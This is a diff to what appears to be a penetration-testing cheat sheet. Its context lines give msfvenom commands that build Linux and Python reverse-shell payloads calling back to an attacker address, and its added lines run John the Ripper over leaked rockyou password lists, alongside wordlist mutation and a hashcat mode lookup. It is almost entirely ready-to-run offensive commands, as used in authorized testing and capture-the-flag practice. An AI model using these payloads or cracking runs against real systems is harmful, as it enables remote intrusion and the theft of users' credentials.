@@ -341,8 +341,17 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.e
 msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
 
 [*] Cracking
++---------- Word Count Wordlist ----------+
+wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
+
 +---------- Mutated Wordlist ----------+
 psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.list
+
++---------- John ----------+
+john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
+john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
+john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 
 +---------- Hashcat ----------+
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'kerberos'
